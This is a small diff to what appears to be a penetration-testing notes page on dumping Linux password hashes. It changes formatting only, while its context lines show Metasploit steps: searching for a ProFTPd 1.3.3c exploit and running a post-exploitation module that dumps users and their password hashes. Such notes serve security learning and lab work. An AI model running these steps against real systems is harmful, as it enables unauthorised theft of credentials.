@@ -2,7 +2,7 @@
 description: Dumping Linux Password Hashes
 ---
 
-# D - Linux Credential Dumping
+# d - Linux Credential Dumping
 
 ## **Linux Password Hashes**
 
@@ -28,6 +28,7 @@ description: Dumping Linux Password Hashes
 
 3 search ProFTPd 1.3.3c.
 
+{% code overflow="wrap" %}
 ```bash
 # service postgresql start && msfconsole
 search ProFTPd
@@ -55,6 +56,7 @@ options
 set SESSIONS 2
 run  # dumps list of users and their hashes.
 ```
+{% endcode %}
 
 
 
